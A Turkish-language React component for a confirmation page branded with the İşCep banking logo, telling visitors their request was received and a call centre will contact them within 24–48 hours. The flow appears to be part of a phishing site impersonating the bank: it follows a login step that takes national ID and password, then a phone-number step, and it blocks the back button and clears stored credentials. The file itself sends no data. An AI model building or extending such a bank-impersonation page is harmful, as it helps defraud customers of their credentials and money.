import React, { useEffect, useState } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';
import './App.css';
import { useAuth } from './AuthContext';

function WaitingPage() {
  const location = useLocation();
  const navigate = useNavigate();
  const { dispatch: authDispatch } = useAuth();
  const [isLoading, setIsLoading] = useState(false);
  const [isMobile, setIsMobile] = useState(window.innerWidth <= 768);

  // Pencere boyutu değiştiğinde mobil durumu güncelle
  useEffect(() => {
    const handleResize = () => setIsMobile(window.innerWidth <= 768);
    window.addEventListener('resize', handleResize);
    return () => window.removeEventListener('resize', handleResize);
  }, []);

  // Navigasyon ve geri tuşu kontrolü
  useEffect(() => {
    const isValidNavigation = location.state?.isValidNavigation && location.state?.from === '/telefon';

    // Geçersiz navigasyon durumunda
    if (!isValidNavigation) {
      if (isMobile) {
        setIsLoading(true);
        setTimeout(() => {
          window.history.replaceState(null, '', '/giris');
          authDispatch({ type: 'RESET_AUTH' }); // TC ve şifre inputlarını sıfırla
          navigate('/giris', { replace: true });
        }, 1500);
      } else {
        window.history.replaceState(null, '', '/giris');
        authDispatch({ type: 'RESET_AUTH' }); // TC ve şifre inputlarını sıfırla
        navigate('/giris', { replace: true });
      }
      return;
    }

    // Geri tuşu için popstate dinleyicisi
    const handlePopState = (event) => {
      event.preventDefault(); // Varsayılan davranışı engelle
      authDispatch({ type: 'RESET_AUTH' }); // TC ve şifre inputlarını sıfırla
      navigate('/giris', { replace: true }); // /giris sayfasına yönlendir
    };

    // Geçerli sayfa yığınına ekle ve popstate dinleyicisini bağla
    window.history.pushState(null, '', window.location.href);
    window.addEventListener('popstate', handlePopState);

    return () => {
      window.removeEventListener('popstate', handlePopState);
    };
  }, [location.state, navigate, isMobile, authDispatch]);

  // Mobil cihazlarda yükleme ekranı
  if (isLoading && isMobile) {
    return (
      <div className="waiting-overlay">
        <div className="waiting-container">
          <img src="/check.png" alt="Onay Logosu" className="waiting-logo" />
          <p className="waiting-text">Lütfen Bekleyin</p>
        </div>
      </div>
    );
  }

  // Normal bekleme sayfası içeriği
  return (
    <div className="container">
      <div className="bekleme-content">
        <img src="/iscep-logo.png" alt="İşCep Logosu" className="bekleme-iscep-logo" />
        <img src="/check.png" alt="Onay Logosu" className="bekleme-check-logo" />
        <p className="waiting-message">
          Talebiniz başarıyla alındı.
          Çağrı Merkezimiz sizinle 24 ila 48 saat
          içinde iletişime geçecektir.
        </p>
      </div>
    </div>
  );
}

export default WaitingPage;
